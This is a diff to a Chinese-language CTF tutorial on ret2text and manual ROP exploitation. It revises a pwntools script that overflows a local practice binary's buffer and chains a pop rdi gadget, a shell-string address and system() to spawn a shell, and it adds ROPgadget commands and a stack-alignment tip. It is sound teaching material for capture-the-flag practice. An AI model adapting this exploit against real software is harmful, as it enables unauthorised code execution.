@@ -87,21 +87,28 @@ io.interactive() #进行交互
 
 :star2:高级手动构造rop的exp:
 
+查询poprdi地址：
+
+```
+ROPgadget --binary ./pwn --only "pop|ret"
+```
+
 ```python
 from pwn import *
-context(os="linux",arch='amd64',log_level="debug")
-elf = ELF("./pwn")
-io = process("./pwn")
-backdoor = elf.symbols["backdoor"]
-sys_adr = elf.symbols["system"]
-print(hex(backdoor))
-pop_rdi = 0x4012c3
-shell_adr = 0x40201A
-payload = 0x58*b's'+ p64(backdoor)
-payload = b's' * 0x58 +p64(pop_rdi) + p64(shell_adr) +p64(sys_adr)
-# io.recvline()
-io.sendlineafter(b"do you know ret2text?",payload)
-io.interactive()
+context(os='linux',arch='amd64',log_level='debug')
+elf = ELF("./pwn") #使用ELF函数去解析目标文件，存储为elf对象
+io = process("./pwn") #启动一个进程，命名为io
+io.recvuntil(b"do you know ret2text?\n") #一直接收数据，直到接收到指定数据
+back_door = 0x401235 #ida查找后门地址
+ret = 0x40101a #ROPgadget --binary ./pwn --only"pop|ret"
+# payload = b's'*0x58 + p64(ret) + p64(back_door) #填充正常空间+rbp + 恶意地址4
+#ROPgadget --binary ./pwn --only "pop|ret"
+pop_rdi_ret =0x4012c3
+shell_adr = 0x40201A #ida查询
+sys_adr = elf.symbols['system']
+payload = b's'*0x58 + p64(pop_rdi_ret) + p64(shell_adr) + p64(sys_adr)
+io.sendline(payload) #发生payloa
+io.interactive() #进行交互
 ```
 
 新版添加了栈对齐校验也有办法绕过，添加一个ret指令即可：
@@ -109,7 +116,7 @@ io.interactive()
 使用ROPgadget查询ret指令：
 
 ```bash
-ROPgadget --binary ./pwn --only"pop|ret"
+ROPgadget --binary ./pwn --only "pop|ret"
 ```
 
 ![image-20240522173002990](http://image.shangu127.top/img/2024/03/image-20240522173002990.png)
